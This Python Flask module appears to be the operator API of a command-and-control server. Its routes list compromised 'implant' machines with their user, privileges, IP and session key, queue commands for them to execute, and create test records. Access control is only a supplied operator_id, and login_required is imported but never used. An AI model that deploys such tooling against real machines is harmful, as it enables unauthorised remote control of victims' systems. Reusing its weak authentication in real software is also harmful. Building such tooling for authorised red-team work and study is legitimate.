from datetime import datetime
from flask import (
    Blueprint, flash, g, jsonify, make_response,
    redirect, render_template, request, Response, url_for
)
import json
from werkzeug.exceptions import abort

from .auth import login_required
from .db import db
from .models import Command, Implant, Operator

# TODO: Delete later, for testing only
from pprint import pprint

bp = Blueprint('operator', __name__)


@bp.route('/')
def index():
    operators = Operator.query.all()
    return render_template('operator/index.html', operators=operators)


# TODO: Maybe put operator_id in header instead
@bp.route('/implant', methods=['GET'])
def get_implant():
    implant_id = request.args.get("implant_id")
    operator_id = request.args.get("operator_id")
    error = None

    if not implant_id:
        error = "implant_id is required."
    elif not operator_id:
        error = "operator_id is required."

    if error:
        return Response(response=error, status=400, mimetype='application/json')

    #  Check operator_id is valid
    operator = Operator.query.filter_by(id=operator_id).first()

    if not operator:
        error = "operator_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    implant = Implant.query.filter_by(id=implant_id).first()

    if not implant:
        error = "implant_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    response = {
        "computer_name": implant.computer_name,
        "computer_privileges": implant.computer_privileges,
        "computer_user": implant.computer_user,
        "connecting_ip_address": implant.connecting_ip_address,
        "expected_check_in": implant.expected_check_in,
        "last_seen": implant.last_seen,
        "computer_guid": implant.computer_guid,
        "session_key": implant.session_key,
        "sleep": implant.sleep,
        "jitter": implant.jitter,
        "first_seen": implant.first_seen
    }

    response = jsonify(response)

    return make_response(response, 200)


@bp.route('/implant/all', methods=['GET'])
def list_all_implants():
    error = None
    operator_id = request.args.get("operator_id")

    if not operator_id:
        error = "operator_id is required."
        return Response(response=error, status=400, mimetype='application/json')

    operator = Operator.query.filter_by(id=operator_id).first()

    if not operator:
        error = "operator_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    query_result = Implant.query.all()
    implants = []

    for implant in query_result:
        implants.append({
            "implant_id": implant.id,
            "computer_name": implant.computer_name,
            "computer_privileges": implant.computer_privileges,
            "computer_user": implant.computer_user,
            "connecting_ip_address": implant.connecting_ip_address,
            "expected_check_in": implant.expected_check_in,
            "last_seen": implant.last_seen
        })

    response = jsonify(implants)

    return make_response(response, 200)


# Set request content type to application/json
@bp.route('/storeCommandForImplant', methods=['POST'])
def store_command_for_implant():

    data = request.json
    command_type = data['command_type']
    command_text = data['command_text']
    implant_id = data['implant_id']
    operator_id = data['operator_id']
    error = None

    if not command_type:
        error = 'command_type is required.';
    elif not command_text:
        error = 'command_text is required.';
    elif not implant_id:
        error = 'implant_id is required.';
    elif not operator_id:
        error = 'operator_id is required.';

    operator = Operator.query.filter_by(id=operator_id).first()

    if not operator:
        error = "operator_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    implant = Implant.query.filter_by(id=implant_id).first()

    if not implant:
        error = "implant_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    # TODO: Get length of timestamp, update database
    time_issued = datetime.now()
    status = "not_taken_by_implant"
    command_result = None

    if error:
        return Response(response=error, status=400, mimetype='application/json')

    command = Command(
        command_type = command_type,
        command_text = command_text,
        implant_id = implant_id,
        operator_id = operator_id,
        time_issued = time_issued,
        status = status,
        command_result = command_result
    )

    db.session.add(command)
    db.session.commit()

    return Response(response='Command stored.', status=200, mimetype='application/json')


# For testing only, delete later
@bp.route('/make-test-implant', methods=['GET'])
def make_test_implant():
    id = None

    try:
        implant = Implant(
            computer_name = "test_computer_name",
            computer_user = "test_computer_user",
            computer_privileges = "test_computer_privileges",
            connecting_ip_address = "test_connecting_ip_address",
            last_seen = "test_last_seen",
            expected_check_in = "test_expected_check_in",
            computer_guid = "test_computer_guid",
            session_key = "test_session_key",
            sleep = "test_sleep",
            jitter = "test_jitter",
            first_seen = "test_first_seen"
        )

        db.session.add(implant)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(implant, attribute_names=[])
        id = implant.id
    except Exception as e:
        print(f"Error in make_fake_implant: {e}")
        return make_response(e, 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)


# For testing only, delete later
@bp.route('/make-test-operator', methods=['GET'])
def make_test_operator():
    id = None

    try:
        operator = Operator(
            username = "test_username",
            password_hash = "test_password_hash"
        )

        db.session.add(operator)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(operator, attribute_names=[])
        id = operator.id
    except Exception as e:
        print(f"Error in make_fake_operator: {e}")
        return make_response(e, 500)

    response = {
        "id": id
    }

    response = jsonify(response)

    return make_response(response, 200)
